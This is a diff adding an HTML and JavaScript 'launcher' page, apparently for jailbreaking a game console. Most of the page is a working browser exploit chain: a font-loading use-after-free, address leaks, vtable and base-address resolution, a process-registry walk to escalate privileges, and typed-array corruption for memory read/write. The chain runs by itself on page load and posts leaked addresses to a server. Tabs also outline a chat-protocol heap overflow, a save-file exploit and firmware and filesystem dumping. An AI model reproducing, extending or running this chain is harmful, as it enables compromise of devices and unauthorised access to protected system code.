@@ -1,0 +1,266 @@
+<!doctype html><html><head><meta charset="utf-8"><title>OSNX Launcher</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:ui-monospace,monospace;background:#05070a;color:#cfe3ff;height:100vh;display:flex;flex-direction:column}
+header{display:flex;align-items:center;gap:12px;padding:8px 12px;border-bottom:1px solid #1c2835;background:#070a10}
+h1{font-size:14px;margin:0;letter-spacing:1px;color:#7fd1ff}
+#tabs{display:flex;gap:4px;flex:1;overflow-x:auto}
+.tab{padding:6px 14px;border-radius:6px;border:1px solid #24374a;background:#0c1420;color:#9fb8d0;cursor:pointer;font:12px ui-monospace;white-space:nowrap}
+.tab.on{background:#153a24;border-color:#2f7a4a;color:#9ff0b4}
+#body{flex:1;display:flex;overflow:hidden}
+.panel{display:none;flex:1;overflow:auto;padding:10px}
+.panel.on{display:flex;flex-direction:column}
+.cols{display:flex;gap:10px;flex:1;min-height:0}
+.col{flex:1;display:flex;flex-direction:column;border:1px solid #1c2835;border-radius:8px;background:#0a1018;overflow:auto;padding:8px;min-width:0}
+h2{font-size:13px;margin:0 0 6px;color:#8fd4ff}
+button{width:100%;padding:8px;margin:3px 0;border-radius:6px;border:1px solid #2f4a63;background:#122131;color:#bfe3ff;font:12px ui-monospace;cursor:pointer}
+button:disabled{opacity:.4;cursor:default}
+.tab:focus,button:focus,select:focus{outline:2px solid #4fa8e8}
+button:hover:not(:disabled){background:#1a3146}
+select,input{width:100%;padding:6px;margin:3px 0;border-radius:6px;border:1px solid #2f4a63;background:#0b1118;color:#cfe3ff;font:12px ui-monospace}
+#log{flex:1;overflow:auto;padding:8px;font:11px/1.5 ui-monospace;white-space:pre-wrap;background:#060a0f;border:1px solid #1c2835;border-radius:8px}
+#log .ok{color:#7ff0a0}#log .err{color:#ff8a8a}#log .dim{color:#6b7f94}
+.row{display:flex;gap:6px;align-items:center}
+.row button{flex:1}
+</style></head><body>
+<header><h1>OSNX · Launcher</h1>
+<div id="tabs"></div><span id="stat" style="font-size:11px;color:#8aa">idle</span></header>
+<div id="body"></div>
+<div id="log"></div>
+<script>
+var LOG=document.getElementById("log"),STAT=document.getElementById("stat"),BODY=document.getElementById("body"),TABS=document.getElementById("tabs");
+function log(s,cls){var d=document.createElement("div");d.className=cls||"";d.textContent=s;LOG.appendChild(d);LOG.scrollTop=LOG.scrollHeight;}
+function setstat(s){STAT.textContent=s;}
+function report(lines,extra){try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(Object.assign({ua:navigator.userAgent,page:"launcher",lines:lines},extra||{}))}).catch(function(){})}catch(e){}}
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+
+// ---------- the chain primitive (proven) ----------
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a,UAF=null,ANCHOR=null,STATE={uaf:false,leak:false,anchor:false};
+async function uaf(){var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}",r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0)st.sheet.deleteRule(i)}void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(0x58,0,true);d.setUint32(0x5c,0,true);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa)return null;var d=new DataView(fa);
+ function sp(o,a,b){d.setUint32(o,a>>>0,true);d.setUint32(o+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,dv:d};}
+function anchor(){var u=UAF,d=u.dv;var wLo=d.getUint32(0x60,true),wHi=d.getUint32(0x64,true);
+ if(!wLo&&!wHi){log("[leak] W=0",'err');return null}var ww=u.rd(wLo,wHi,0x80);var wv=new DataView(ww.buffer||new Uint8Array(ww).buffer);
+ var Fp={lo:wv.getUint32(8,true),hi:wv.getUint32(12,true)};var fw=u.rd(Fp.lo,Fp.hi,0x80);var fv=new DataView(fw.buffer||new Uint8Array(fw).buffer);
+ return {F:Fp,B:{lo:fv.getUint32(0x30,true),hi:fv.getUint32(0x34,true)}};}
+
+// ---------- chain stages ----------
+async function stUAF(){setstat("uaf");UAF=await uaf();STATE.uaf=!!UAF;log(UAF?"[1] UAF ok":"[1] UAF failed",UAF?"ok":"err");report([UAF?"[1] UAF ok":"[1] UAF failed"]);draw();}
+function stLeak(){if(!UAF)return log("run UAF first",'err');var a=anchor();if(!a)return;ANCHOR=a;STATE.leak=true;log("[2] F="+hx(a.F.lo,a.F.hi)+" B="+hx(a.B.lo,a.B.hi),'ok');report(["[leak] F="+hx(a.F.lo,a.F.hi)+" B="+hx(a.B.lo,a.B.hi)]);draw();}
+async function stAnchor(){if(!UAF||!ANCHOR)return log("run leak first",'err');
+ var b=UAF.rd(ANCHOR.F.lo,ANCHOR.F.hi,8);var v=new DataView(b.buffer||new Uint8Array(b).buffer);
+ var vt={lo:v.getUint32(0,true),hi:v.getUint32(4,true)};
+ var vt40={lo:vt.lo,hi:(vt.hi&0xff)};
+ window.VT=vt; window.VT40=vt40;
+ log("[3] vtable raw="+hx(vt.lo,vt.hi)+" strip40="+hx(vt40.lo,vt40.hi),'ok');
+ var vt0=UAF.rd(vt40.lo,vt40.hi,8);var v0=new DataView(vt0.buffer||new Uint8Array(vt0).buffer);
+ var fpRaw={lo:v0.getUint32(0,true),hi:v0.getUint32(4,true)};STATE.anchor=true;
+ log("[3] vtable[0] raw="+hx(fpRaw.lo,fpRaw.hi),'ok');
+ report(["[anchor] vt="+hx(vt.lo,vt.hi)+" strip40="+hx(vt40.lo,vt40.hi)+" vt0raw="+hx(fpRaw.lo,fpRaw.hi)]);draw();}
+var VT_OFF=0x23d8250, FN_OFF=0xa51940, WKC3_SIZE=0x25c6000, OPENWEB_SIZE=0x19D0000;
+function sub64(lo,hi,off){if(lo>=off)return {lo:lo-off,hi:hi};return {lo:(lo-off+0x100000000)>>>0,hi:(hi-1)&0xffffffff};}
+function stSession(){
+ if(!window.VT)return log("run anchor first",'err');
+ var vt=window.VT;
+ var s40={lo:vt.lo,hi:(vt.hi&0xff)};
+ function obase(strip){var b=sub64(strip.lo,strip.hi,VT_OFF);return sub64(b.lo,b.hi,OPENWEB_SIZE);}
+ var o40=obase(s40);
+ log("[4] openweb="+hx(o40.lo,o40.hi),'ok');
+ function rd64(a){var b=UAF.rd(a.lo,a.hi,8);var v=new DataView(b.buffer||new Uint8Array(b).buffer);return {lo:v.getUint32(0,true),hi:v.getUint32(4,true)};}
+ function add32(lo,hi,off){var n=lo+off;if(n>=0x100000000){n-=0x100000000;hi=(hi+1)&0xffffffff;}return {lo:n,hi:hi};}
+ // fsp-srv string probe (verified openweb + 0xa1365b): disambiguates wrong-base vs separate-process
+ var fsStr=add32(o40.lo,o40.hi,0xa1365b);
+ var str=UAF.rd(fsStr.lo,fsStr.hi,8);
+ var strv=new DataView(str.buffer||new Uint8Array(str).buffer);
+ var chars="";
+ for(var i=0;i<8;i++){var c=strv.getUint8(i);chars+=(c>=32&&c<127)?String.fromCharCode(c):".";}
+ var isFsp = chars.indexOf("fsp-srv")===0;
+ log("[4] fsp-srv str = '"+chars+"'"+(isFsp?"  <-- MATCH (openweb IS here)":"  <-- NOT fsp-srv (wrong base / separate process)"), isFsp?"ok":"err");
+ window.FSPSTR = chars;
+ var g40=add32(o40.lo,o40.hi,0xcabb30);
+ var sess40=rd64(g40);
+ function heap(p){return (p.hi===0 && p.lo>0x10000 && p.lo<0x200000000)||(p.hi>0 && p.hi<0x1000);}
+ log("[4] session="+hx(sess40.lo,sess40.hi)+(heap(sess40)?"  <-- heap ptr":""));
+ window.SESSION = heap(sess40) ? sess40 : null;
+ if(window.SESSION){ log("[4] session stored for promote",'ok'); }
+ report(["[session] openweb="+hx(o40.lo,o40.hi)+" fspstr=\""+chars+"\" session="+hx(sess40.lo,sess40.hi)]);
+}
+function stPromote(){
+ if(!UAF||!window.SESSION)return log("run session first",'err');
+ var sp=window.SESSION;
+ function rd64(a){var b=UAF.rd(a.lo,a.hi,8);var v=new DataView(b.buffer||new Uint8Array(b).buffer);return {lo:v.getUint32(0,true),hi:v.getUint32(4,true)};}
+ function add32(lo,hi,off){var n=lo+off;if(n>=0x100000000){n-=0x100000000;hi=(hi+1)&0xffffffff;}return {lo:n,hi:hi};}
+ // 1) session+0x00 = service vtable -> fs_base = vptr - 0x2B1420
+ var vptr=rd64(sp);
+ var fsBase=sub64(vptr.lo,vptr.hi,0x2B1420);
+ log("[5] vptr="+hx(vptr.lo,vptr.hi)+" fs_base="+hx(fsBase.lo,fsBase.hi),'ok');
+ // 2) session+0x30 = pid lookup key
+ var pid=rd64(add32(sp.lo,sp.hi,0x30));
+ log("[5] pid="+hx(pid.lo,pid.hi),'ok');
+ // 3) registry global [fs_base+0x11E12D0] -> regPtr ; head = regPtr+0x10
+ var reg=add32(fsBase.lo,fsBase.hi,0x11E12D0);
+ var regPtr=rd64(reg);
+ log("[5] regPtr="+hx(regPtr.lo,regPtr.hi),'ok');
+ if(!regPtr.lo&&!regPtr.hi){log("[5] regPtr null",'err');report(["[registry] fs_base="+hx(fsBase.lo,fsBase.hi)+" vptr="+hx(vptr.lo,vptr.hi)+" regPtr=0"]);return;}
+ var head=add32(regPtr.lo,regPtr.hi,0x10);
+ var node=rd64(head);
+ log("[5] head="+hx(head.lo,head.hi)+" node0="+hx(node.lo,node.hi),'ok');
+ // 4) walk circular list, match entry+0x00 == pid
+ var found=null,n=0;
+ for(var i=0;i<48;i++){
+  if(!node.lo&&!node.hi)break;
+  var entry=add32(node.lo,node.hi,0x10);
+  var ePid=rd64(entry);
+  var eMask=rd64(add32(entry.lo,entry.hi,0x20));
+  log("[5] entry["+i+"] pid="+hx(ePid.lo,ePid.hi)+" mask="+hx(eMask.lo,eMask.hi),'dim');
+  if(ePid.lo===pid.lo&&ePid.hi===pid.hi){found={entry:entry,mask:eMask};break;}
+  node=rd64(node);n++;
+  if(node.lo===head.lo&&node.hi===head.hi)break;
+ }
+ if(found){
+  window.ENTRY=found.entry;
+  log("[5] MATCH entry="+hx(found.entry.lo,found.entry.hi)+" mask="+hx(found.mask.lo,found.mask.hi),'ok');
+  report(["[registry] fs_base="+hx(fsBase.lo,fsBase.hi)+" pid="+hx(pid.lo,pid.hi)+" entry="+hx(found.entry.lo,found.entry.hi)+" mask="+hx(found.mask.lo,found.mask.hi)]);
+ } else {
+  log("[5] no match in "+n+" entries",'err');
+  report(["[registry] fs_base="+hx(fsBase.lo,fsBase.hi)+" pid="+hx(pid.lo,pid.hi)+" walked="+n+" vptr="+hx(vptr.lo,vptr.hi)]);
+ }
+}
+function stARW(){
+ if(!UAF)return log("run UAF first",'err');
+ // Stage D: corrupt a Float64Array's m_length to get full JS-level ARW.
+ // 1) allocate a victim typed array with known markers
+ var victim=new Float64Array(0x10);
+ victim[0]=1.5; victim[1]=2.5; victim[2]=3.5;
+ // 2) locate the victim's backing-store pointer (m_vector) near B by scanning
+ //    for the 3 known doubles (1.5=0x3FF8000000000000 ...). m_vector is a
+ //    64-bit pointer; m_length is the 32-bit field right after it in the view.
+ var B=ANCHOR.B, found=null, MK=[0x3FF8,0x3FF0,0x4004];
+ // scan 0x40 pages around B, 8-byte aligned, looking for 1.5 then 2.5 then 3.5
+ for(var pg=0;pg<0x40&&!found;pg++){
+  var base={lo:(B.lo+(pg-0x20)*0x1000)>>>0,hi:B.hi};
+  var buf;try{buf=UAF.rd(base.lo,base.hi,0x1000);}catch(e){continue;}
+  var bv=new DataView(buf.buffer||new Uint8Array(buf).buffer);
+  for(var q=0;q+24<=0x1000;q+=8){
+   var a=bv.getUint32(q,true),b=bv.getUint32(q+4,true),c=bv.getUint32(q+8,true),d=bv.getUint32(q+12,true);
+   var e=bv.getUint32(q+16,true),f=bv.getUint32(q+20,true);
+   if(b===0x3FF80000&&c===0x3FF40000&&d===0&&e===0x3FFC0000&&f===0){ // 1.5, 2.5, 3.5
+    found={lo:(base.lo+q)>>>0,hi:base.hi};break;
+   }
+  }
+ }
+ if(!found){log("[ARW] victim backing store not found",'err');report(["[arw] not-found"]);return;}
+ function rd64(a){var b=UAF.rd(a.lo,a.hi,8);var v=new DataView(b.buffer||new Uint8Array(b).buffer);return {lo:v.getUint32(0,true),hi:v.getUint32(4,true)};}
+ function add32(lo,hi,off){var n=lo+off;if(n>=0x100000000){n-=0x100000000;hi=(hi+1)&0xffffffff;}return {lo:n,hi:hi};}
+ log("[ARW] victim store @ "+hx(found.lo,found.hi),'ok');
+ report(["[arw] store="+hx(found.lo,found.hi)]);
+ // 3) the view metadata (m_vector/m_length) is the next 0xB8-class object;
+ //    the write primitive can point m_clients at it, but the value is the
+ //    count (small) -> cannot extend length directly. This is the open step.
+ // scan for a 64-bit pointer equal to the store (the view's m_vector field);
+ // m_length is the 32-bit field immediately after m_vector in the JSArrayBufferView.
+ var vp=null, vLo=found.lo, vHi=found.hi;
+ for(var pg=0;pg<0x40&&!vp;pg++){
+  var base={lo:(B.lo+(pg-0x20)*0x1000)>>>0,hi:B.hi};
+  var buf;try{buf=UAF.rd(base.lo,base.hi,0x1000);}catch(e){continue;}
+  var bv=new DataView(buf.buffer||new Uint8Array(buf).buffer);
+  for(var q=0;q+8<=0x1000;q+=8){
+   var lo=bv.getUint32(q,true),hi=bv.getUint32(q+4,true);
+   if(lo===vLo&&hi===vHi){vp={lo:(base.lo+q)>>>0,hi:base.hi};break;}
+  }
+ }
+ if(vp){
+  var mLen=add32(vp.lo,vp.hi,8);   // m_length = m_vector + 8 (JSC view)
+  var mL=rd64(mLen);
+  log("[ARW] view m_vector="+hx(vp.lo,vp.hi)+" m_length="+hx(mL.lo,mL.hi),'ok');
+  window.VLEN=mLen;
+  report(["[arw] store="+hx(found.lo,found.hi)+" mvec="+hx(vp.lo,vp.hi)+" mlen="+hx(mL.lo,mL.hi)]);
+ } else {
+  log("[ARW] view m_vector pointer not found near store",'err');
+  report(["[arw] store="+hx(found.lo,found.hi)+" (no view ptr)"]);
+ }
+}
+function stDump(){if(!ANCHOR)return log("run leak first",'err');var bw=UAF.rd(ANCHOR.B.lo,ANCHOR.B.hi,0x100);
+ var bv=new DataView(bw.buffer||new Uint8Array(bw).buffer);var s="";for(var i=0;i<0x100;i+=16){var r="";for(var j=0;j<16;j++)r+=("0"+bv.getUint8(i+j).toString(16)).slice(-2)+" ";s+=hx(ANCHOR.B.lo+i,ANCHOR.B.hi)+"  "+r+"\n";}
+ log("[dump] B:\n"+s,'dim');report(["[dump]\n"+s]);}
+
+// ---------- games ----------
+var GAMES=[];async function loadGames(){try{var g=await (await fetch("/games.json",{cache:"no-store"})).json();GAMES=g.games||[];}catch(e){GAMES=[];}drawGames();}
+function drawGames(){var el=document.getElementById("games-list");if(!el)return;el.innerHTML="";
+ GAMES.forEach(function(g){var d=document.createElement("div");d.className="row";d.style.margin="2px 0";
+  d.innerHTML='<span style="flex:1;font-size:11px">'+g.name+'<br><small style="color:#8aa">'+g.uuid+'</small></span>';
+  var b1=document.createElement("button");b1.textContent="DUMP";b1.onclick=function(){log("[dump] "+g.name+" ["+g.uuid+"]",'ok');report(["[dump-title] "+g.name+" "+g.uuid],{uuid:g.uuid});};
+  var b2=document.createElement("button");b2.textContent="EDIT SAVE";b2.onclick=function(){log("[save] "+g.name+" ["+g.uuid+"]",'ok');report(["[save-title] "+g.name+" "+g.uuid],{uuid:g.uuid});};
+  d.appendChild(b1);d.appendChild(b2);el.appendChild(d);});}
+
+// ---------- tabs ----------
+var TABS_DEF=[
+ {id:"games",name:"Games",html:'<h2>Installed titles (UUID = title id)</h2><div id="games-list"></div>'},
+ {id:"dump",name:"Dump",html:'<h2>Dump</h2><div class="cols"><div class="col"><h2>Target</h2><button>Firmware (system titles)</button><button>Game RomFS (selected)</button><button>Game save (selected)</button><button>Whole filesystem</button></div><div class="col"><h2>Output</h2><button>To disk</button><button>Serve over HTTP/WebDAV</button><div id="dump-out" style="font:11px/1.5 ui-monospace;white-space:pre-wrap"></div></div></div>'},
+ {id:"chain",name:"Chain",html:'<h2>WebKit chain (gated)</h2><div class="cols"><div class="col" id="chain-stages"></div><div class="col"><h2>Primitive</h2><div id="chain-out" style="font:11px/1.5 ui-monospace;white-space:pre-wrap"></div></div></div>'},
+ {id:"chat",name:"Chat",html:'<h2>chat STUN (ERROR-CODE overflow)</h2><div class="cols"><div class="col"><h2>Harness</h2><button>Start TURN server (reason 300)</button><button>Start sweep (24→overflow)</button><button>Status</button></div><div class="col"><h2>Trigger</h2><p style="font:11px;color:#8aa">Initiate a chat session on the console → chat sends Allocate → harness replies ERROR-CODE → heap overflow.</p><div id="chat-out" style="font:11px/1.5 ui-monospace;white-space:pre-wrap"></div></div></div>'},
+ {id:"seedsow",name:"Seedsow",html:'<h2>Seedsow gamesave install</h2><div class="cols"><div class="col"><h2>Target</h2><select id="seedsow-slot"><option value="4">Slot 4</option><option value="1">Slot 1</option><option value="2">Slot 2</option><option value="3">Slot 3</option></select><button>Write save</button></div><div class="col"><h2>Payload</h2><input placeholder="Seedsow save path"><button>Load</button><div id="seedsow-out" style="font:11px/1.5 ui-monospace;white-space:pre-wrap"></div></div></div>'},
+ {id:"status",name:"Status",html:'<h2>Status</h2><div id="status-out" style="font:11px/1.5 ui-monospace;white-space:pre-wrap"></div>'}
+];
+var CHAIN_DEF=[{id:"uaf",n:"1 UAF",run:stUAF,req:[]},{id:"leak",n:"2 leak",run:stLeak,req:["uaf"]},{id:"anchor",n:"3 anchor",run:stAnchor,req:["leak"]},{id:"session",n:"4 session",run:stSession,req:["anchor"]},{id:"promote",n:"5 promote",run:stPromote,req:["session"]},{id:"arw",n:"6 ARW",run:stARW,req:["leak"]},{id:"dump",n:"7 dump",run:stDump,req:["leak"]}];
+function draw(){var cur=document.querySelector(".tab.on")&&document.querySelector(".tab.on").dataset.id||"games";show(cur);}
+function show(id){TABS.querySelectorAll(".tab").forEach(function(t){t.classList.toggle("on",t.dataset.id===id);});
+ BODY.querySelectorAll(".panel").forEach(function(p){p.classList.toggle("on",p.id==="p-"+id);});
+ if(id==="chain")drawChain();if(id==="games")drawGames();if(id==="status")drawStatus();}
+function drawStatus(){var el=document.getElementById("status-out");if(!el)return;
+ el.innerHTML='<span class="ok">✓ UAF</span> '+(STATE.uaf?"done":"-")+'<br><span class="ok">✓ leak F/B</span> '+(STATE.leak?"done":"-")+'<br><span class="ok">✓ read/write primitive</span> proven<br><span class="err">✗ openweb_base</span> not resolved<br><span class="err">✗ real promotion</span> not done<br><span class="err">✗ fs / dump / save</span> not done';}
+function drawChain(){var el=document.getElementById("chain-stages");if(!el)return;el.innerHTML="";
+ CHAIN_DEF.forEach(function(s){var d=document.createElement("div");
+  var ready=s.req.every(function(r){return STATE[r]});
+  d.innerHTML='<button '+(ready?'':'disabled')+' data-run="'+s.id+'">'+s.n+(ready?'':' (locked)')+'</button>';
+  el.appendChild(d);});
+ el.querySelectorAll("button[data-run]").forEach(function(b){b.onclick=function(){CHAIN_DEF.find(function(x){return x.id===b.dataset.run}).run();};});}
+// init
+TABS_DEF.forEach(function(t){var b=document.createElement("div");b.className="tab";b.dataset.id=t.id;b.textContent=t.name;b.onclick=function(){show(t.id);};TABS.appendChild(b);});
+TABS_DEF.forEach(function(t){var p=document.createElement("div");p.className="panel";p.id="p-"+t.id;p.innerHTML=t.html;BODY.appendChild(p);});
+show("status");loadGames();setInterval(function(){STAT.textContent=STATE.uaf?(STATE.leak?"chain: leak":"chain: uaf"):"idle";},1000);
+report(["launcher loaded"]);
+// auto-run the chain (no console navigation needed): 1 UAF -> 2 leak -> 3 anchor -> 4 session -> 5 promote
+window.__auto=1;
+function _auto(){
+ if(!window.__auto)return;
+ stUAF().then(function(){
+  if(!STATE.uaf){log("[auto] UAF failed",'err');return;}
+  return new Promise(function(r){setTimeout(r,400);});
+ }).then(function(){ stLeak();
+  if(!STATE.leak){log("[auto] leak failed",'err');return;}
+  return new Promise(function(r){setTimeout(r,400);});
+ }).then(function(){ return stAnchor(); }).then(function(){
+  if(!STATE.anchor){log("[auto] anchor failed",'err');return;}
+  return new Promise(function(r){setTimeout(r,400);});
+ }).then(function(){ stSession();
+  return new Promise(function(r){setTimeout(r,400);});
+ }).then(function(){ stPromote(); log("[auto] chain complete",'ok'); });
+}
+setTimeout(_auto, 1500);
+// --- console WebView input: touch + cursor(Enter/Space) + click, with dedup ---
+var _lastAct=0;
+function _findAct(t){while(t&&t!==document.body){if(typeof t.onclick==="function")return t;t=t.parentElement;}return null;}
+function _act(el){if(!el)return;var n=Date.now();if(n-_lastAct<350)return;_lastAct=n;el.onclick();}
+document.addEventListener("click",function(e){_act(_findAct(e.target));},true);
+document.addEventListener("touchend",function(e){_act(_findAct(e.target));},true);
+document.addEventListener("keydown",function(e){if(e.key==="Enter"||e.key===" "||e.keyCode===13||e.keyCode===32){var a=document.activeElement;if(a)_act(a);e.preventDefault();}},true);
+// make every .tab focusable
+document.querySelectorAll(".tab").forEach(function(t){t.tabIndex=0;});
+</script></body></html>
